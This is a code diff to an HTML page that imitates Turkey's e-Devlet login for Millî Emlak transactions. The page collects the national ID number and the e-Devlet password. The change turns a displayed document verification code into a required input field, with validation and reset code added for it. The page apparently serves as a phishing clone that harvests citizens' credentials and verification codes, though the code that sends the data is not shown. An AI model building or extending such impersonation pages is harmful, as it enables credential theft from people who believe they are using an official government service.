@@ -37,18 +37,6 @@
         .help-text a { color: #0066cc; text-decoration: underline; }
         .edevlet-footer { text-align: center; padding: 15px; color: #999; font-size: 11px; margin-top: 20px; border-top: 1px solid #eee; }
         .edevlet-footer a { color: #0066cc; text-decoration: none; margin: 0 10px; }
-        .edevlet-belge-kodu {
-            margin-top: 20px;
-            padding: 15px;
-            background: #f0f7ff;
-            border: 1px solid #b8d4f0;
-            border-radius: 8px;
-            font-size: 14px;
-            text-align: center;
-        }
-        .edevlet-belge-kodu strong {
-            color: #1e88e5;
-        }
         @media (max-width: 768px) {
             .edevlet-card { padding: 20px; }
             .edevlet-header { flex-direction: column; align-items: center; text-align: center; }
@@ -80,10 +68,6 @@
         </div>
         <p class="edevlet-info">T.C. Kimlik Numaranızı ve e-Devlet Şifrenizi kullanarak kimliğiniz doğrulandıktan sonra Millî Emlak işlemlerinize devam edebilirsiniz. <a href="#">e-Devlet Şifresi Nedir, Nasıl Alınır?</a></p>
 
-        <div class="edevlet-belge-kodu">
-            <strong>Belge Doğrulama Kodu:</strong> GHJKHFNMFYKHF
-        </div>
-
         <form id="loginForm" onsubmit="return validateLogin(event)">
             <div class="form-row">
                 <label>T.C. Kimlik No</label>
@@ -94,6 +78,13 @@
                 <div style="flex:1;min-width:200px;">
                     <input type="password" id="edevletpass" class="form-input" placeholder="e-Devlet Şifreniz" style="width:100%;">
                     <p class="help-text">* e-Devlet <a href="#">şifrenizi unutmanız durumunda</a> doğruladığınız cep telefonunuzdan yenileme işlemi yapabilirsiniz.</p>
+                </div>
+            </div>
+            <div class="form-row">
+                <label>Belge Doğrulama Kodu</label>
+                <div style="flex:1;min-width:200px;">
+                    <input type="text" id="belgeKodu" class="form-input" placeholder="Belge doğrulama kodunuzu girin" style="width:100%;">
+                    <p class="help-text">* Size verilen belge doğrulama kodunu giriniz.</p>
                 </div>
             </div>
             <div class="form-row">
@@ -152,11 +143,14 @@
             e.preventDefault();
             const tc = document.getElementById('tcno').value.trim();
             const password = document.getElementById('edevletpass').value.trim();
+            const belgeKodu = document.getElementById('belgeKodu').value.trim();
             const captcha = document.getElementById('captcha').value.trim();
+
             if (!tc) { alert('Lütfen T.C. Kimlik Numaranızı giriniz.'); return false; }
             if (tc.length !== 11) { alert('T.C. Kimlik No 11 haneli olmalıdır.'); return false; }
             if (!tcKimlikKontrol(tc)) { alert('Geçerli bir T.C. Kimlik Numarası giriniz.'); return false; }
             if (!password) { alert('Lütfen e-Devlet şifrenizi giriniz.'); return false; }
+            if (!belgeKodu) { alert('Lütfen Belge Doğrulama Kodunuzu giriniz.'); return false; }
             if (!captcha) { alert('Lütfen güvenlik kodunu giriniz.'); return false; }
             if (captcha.toLowerCase() !== currentCaptcha.toLowerCase()) {
                 alert('Güvenlik kodu hatalı! Lütfen tekrar deneyiniz.');
@@ -171,6 +165,7 @@
             if (confirm('Giriş işlemini iptal etmek istediğinize emin misiniz?')) {
                 document.getElementById('tcno').value = '';
                 document.getElementById('edevletpass').value = '';
+                document.getElementById('belgeKodu').value = '';
                 document.getElementById('captcha').value = '';
                 refreshCaptcha();
                 window.location.href = 'index.html';
